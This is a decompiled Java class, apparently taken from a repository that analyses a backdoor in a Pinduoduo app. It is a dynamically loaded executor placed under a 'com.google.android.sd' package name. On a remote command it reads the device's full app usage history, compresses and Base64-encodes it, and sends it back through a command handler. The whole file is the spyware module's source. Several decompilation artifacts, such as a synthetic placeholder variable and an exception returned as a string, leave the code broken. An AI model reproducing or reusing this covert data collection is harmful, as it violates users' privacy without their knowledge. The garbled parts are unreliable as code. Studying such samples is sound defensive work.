package com.google.android.sd.biz_dynamic_dex.usage_event_all;

import android.app.usage.UsageEvents;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.TrackUtils;
import com.google.android.sd.utils.Utils;
import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.zip.GZIPOutputStream;
import org.json.JSONArray;
import org.json.JSONObject;

public class UsageEventAllExecutor extends DynamicCmdExecutor {
  private static String a(Context paramContext, JSONObject paramJSONObject) {
    try {
      long l2 = paramJSONObject.optLong("beginTime");
      long l3 = paramJSONObject.optLong("endTime");
      long l1 = 0L;
      if (l2 < 0L || l3 < 0L || l2 > l3) {
        a(paramContext, "input_time_invalid");
        return null;
      } 
      ArrayList<b> arrayList = new ArrayList();
      HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
      UsageEvents usageEvents = ((UsageStatsManager)paramContext.getSystemService("usagestats")).queryEvents(l2, l3);
      while (usageEvents.hasNextEvent()) {
        UsageEvents.Event event = new UsageEvents.Event();
        usageEvents.getNextEvent(event);
        String str1 = event.getPackageName();
        String str2 = event.getClassName();
        if (!TextUtils.isEmpty(str1) && !TextUtils.isEmpty(str2)) {
          int i = event.getEventType();
          if (i == 1 || i == 2 || i == 23) {
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.append(str1);
            stringBuilder.append("#");
            stringBuilder.append(str2);
            String str3 = stringBuilder.toString();
            List list1 = (List)hashMap.get(str3);
            l2 = l1;
            List<a> list = list1;
            if (list1 == null) {
              StringBuilder stringBuilder1 = new StringBuilder();
              stringBuilder1.append(str1);
              stringBuilder1.append(str2);
              l2 = l1 + ((stringBuilder1.toString().getBytes()).length + 31);
              list = new ArrayList();
            } 
            l3 = event.getTimeStamp();
            a a = new a(l3, i);
            l1 = l2 + ((a.toString().getBytes()).length + 1);
            if (l1 > 2097152L) {
              a(paramContext, "byteLength_out_of_limit_2M");
              break;
            } 
            list.add(a);
            hashMap.put(str3, list);
            arrayList.add(new b(str1, str2, l3, i));
          } 
        } 
      } 
      String str = a((Map)hashMap);
      if (TextUtils.isEmpty(str)) {
        a(paramContext, "compressed_data_is_empty");
        return null;
      } 
      if ((str.getBytes()).length <= 819200L)
        return str; 
      str = a(arrayList);
      if (TextUtils.isEmpty(str)) {
        a(paramContext, "halveEventData_is_null");
        return null;
      } 
      if ((str.getBytes()).length > 819200L) {
        a(paramContext, "halveEventData_out_of_limit");
        return null;
      } 
    } catch (Exception exception) {
      StringBuilder stringBuilder = new StringBuilder("get_events_error:");
      stringBuilder.append(exception.getMessage());
      a(paramContext, stringBuilder.toString());
      return null;
    } 
    return (String)exception;
  }
  
  private static String a(List<b> paramList) {
    int j = paramList.size() / 2;
    int i = 0;
    List<b> list = paramList.subList(0, j);
    HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
    while (i < list.size()) {
      b b = list.get(i);
      if (b != null && !TextUtils.isEmpty(b.a) && !TextUtils.isEmpty(b.b)) {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append(b.a);
        stringBuilder.append("#");
        stringBuilder.append(b.b);
        String str = stringBuilder.toString();
        List<a> list2 = (List)hashMap.get(str);
        List<a> list1 = list2;
        if (list2 == null)
          list1 = new ArrayList(); 
        list1.add(new a(b.c, b.d));
        hashMap.put(str, list1);
      } 
      i++;
    } 
    return a((Map)hashMap);
  }
  
  private static String a(Map<String, List<a>> paramMap) {
    try {
      Object object;
      JSONArray jSONArray = new JSONArray();
      Iterator<String> iterator = paramMap.keySet().iterator();
      long l2 = 0L;
      long l1 = 0L;
      while (true) {
        if (iterator.hasNext()) {
          String str = iterator.next();
          if (!TextUtils.isEmpty(str)) {
            List<a> list = paramMap.get(str);
            if (list != null && !list.isEmpty()) {
              String[] arrayOfString = str.split("#");
              if (arrayOfString.length == 2) {
                JSONObject jSONObject = new JSONObject();
                int i = 0;
                jSONObject.put("pkg", arrayOfString[0]);
                jSONObject.put("cls", arrayOfString[1]);
                JSONArray jSONArray1 = new JSONArray();
                for (long l = 0L;; l = l3) {
                  long l3;
                  if (i < list.size()) {
                    a a = list.get(i);
                    if (a != null) {
                      JSONObject jSONObject1 = new JSONObject();
                      long l4 = a.a;
                      jSONObject1.put("log_ts", l4);
                      jSONObject1.put("type", a.b);
                      jSONArray1.put(jSONObject1);
                      l3 = l;
                      if (l < l4)
                        l3 = l4; 
                    } else {
                      l3 = l;
                    } 
                  } else {
                    Iterator<String> iterator1 = iterator;
                    jSONObject.put("events", jSONArray1);
                    jSONArray.put(jSONObject);
                    long l4 = l2 + jSONArray1.length();
                    l2 = l4;
                    Object object2 = object;
                    iterator = iterator1;
                    if (object < l) {
                      l2 = l4;
                      l3 = l;
                      iterator = iterator1;
                    } 
                    break;
                  } 
                  i++;
                } 
                continue;
              } 
            } 
          } 
        } else {
          JSONObject jSONObject = new JSONObject();
          try {
            jSONObject.put("seq", jSONArray);
            jSONObject.put("all_data_count", l2);
            jSONObject.put("limit_end_time", object);
          } catch (Exception exception1) {}
          return a(jSONObject);
        } 
        Object object1 = object;
        continue;
        object = SYNTHETIC_LOCAL_VARIABLE_8;
      } 
    } catch (Exception exception) {
      exception = null;
    } 
    return a((JSONObject)exception);
  }
  
  private static String a(JSONObject paramJSONObject) {
    String str2 = null;
    JSONObject jSONObject = null;
    if (paramJSONObject == null)
      return null; 
    String str1 = str2;
    try {
      String str;
      ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
      str1 = str2;
      GZIPOutputStream gZIPOutputStream = new GZIPOutputStream(byteArrayOutputStream);
      str1 = str2;
      gZIPOutputStream.write(paramJSONObject.toString().getBytes(StandardCharsets.UTF_8));
      str1 = str2;
      gZIPOutputStream.flush();
      str1 = str2;
      gZIPOutputStream.finish();
      paramJSONObject = jSONObject;
      str1 = str2;
      if (Build.VERSION.SDK_INT >= 26) {
        str1 = str2;
        str = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
        str1 = str;
        TextUtils.isEmpty(str);
      } 
      return str;
    } catch (Exception exception) {
      return str1;
    } 
  }
  
  private static void a(Context paramContext, String paramString) {
    HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
    hashMap.put("status", "0");
    hashMap.put("details", paramString);
    TrackUtils.submitTrack(paramContext, 68, hashMap);
  }
  
  private static void a(Context paramContext, JSONObject paramJSONObject, String paramString) {
    CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(new CmdData(68, paramJSONObject.optString("uuid"), "client"), paramString, null));
  }
  
  public void realExecute(Context paramContext, String paramString) {
    try {
      if (TextUtils.isEmpty(paramString)) {
        a(paramContext, "input_is_empty");
        return;
      } 
      JSONObject jSONObject1 = new JSONObject(paramString);
      PackageManager packageManager = paramContext.getPackageManager();
      if (packageManager == null || packageManager.checkPermission("android.permission.PACKAGE_USAGE_STATS", paramContext.getPackageName()) != 0) {
        a(paramContext, "no_package_usage_stats_permission");
        a(paramContext, jSONObject1, "not has package_usage_stats permission");
        return;
      } 
      String str = a(paramContext, jSONObject1);
      if (TextUtils.isEmpty(str)) {
        a(paramContext, "eventData_is_empty");
        a(paramContext, jSONObject1, "eventData_is_empty");
        return;
      } 
      JSONObject jSONObject2 = new JSONObject();
      jSONObject2.put("data", str);
      CmdHandler.dispatch(paramContext, Utils.buildSucceedRespData(new CmdData(68, jSONObject1.optString("uuid"), "client"), jSONObject2, null));
      return;
    } catch (Exception exception) {
      StringBuilder stringBuilder = new StringBuilder("execute_error:");
      stringBuilder.append(exception.getMessage());
      a(paramContext, stringBuilder.toString());
      return;
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\35604479f8854b5d90bc800e912034fc-dex2jar.jar!\com\google\android\sd\biz_dynamic_de\\usage_event_all\UsageEventAllExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */